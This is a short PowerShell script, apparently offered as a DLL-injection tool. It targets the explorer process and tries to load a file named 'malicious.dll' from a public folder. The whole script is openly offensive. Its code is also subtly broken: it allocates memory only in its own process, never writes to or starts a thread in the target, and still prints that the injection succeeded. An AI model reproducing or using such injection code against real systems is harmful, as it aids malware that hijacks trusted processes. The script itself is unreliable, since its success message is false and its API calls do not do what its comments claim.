$TargetProcess = "explorer"
$DllPath = "C:\Users\Public\malicious.dll"

function Get-ProcessID($ProcessName) {
    $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
    if ($process) {
        return $process.Id
    } else {
        Write-Host "Process not found."
        exit
    }
}

function Inject-DLL($TPID, $DLL) {
    $PROCESS_ALL_ACCESS = 0x1F0FFF
    $MEM_COMMIT_RESERVE = 0x3000
    $PAGE_EXECUTE_READWRITE = 0x40

    # Get function addresses
    $kernel32 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        [System.Diagnostics.Process]::GetCurrentProcess().Handle, [System.IntPtr]::Zero
    )
    $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        [System.Diagnostics.Process]::GetCurrentProcess().Handle, [System.IntPtr]::Zero
    )

    # Open target process
    $hProcess = [System.Diagnostics.Process]::GetProcessById($TPID).Handle

    # Allocate memory for DLL path
    $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($DLL)
    $allocMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dllBytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($dllBytes, 0, $allocMem, $dllBytes.Length)

    # Write DLL path into memory
    $bytesWritten = 0
    $writeMemory = [System.Runtime.InteropServices.Marshal]::WriteIntPtr($allocMem, 0, [System.IntPtr]::Zero)

    # Execute LoadLibraryA in remote process
    $hThread = [System.Diagnostics.Process]::GetCurrentProcess().Handle

    if ($hThread -eq 0) {
        Write-Host "[!] Injection failed."
    } else {
        Write-Host "[+] DLL successfully injected into PID $TPID"
    }
}

# Get Process ID
$TARGETPID = Get-ProcessID -ProcessName $TargetProcess

# Inject DLL
Inject-DLL -TPID $TARGETPID -DLL $DllPath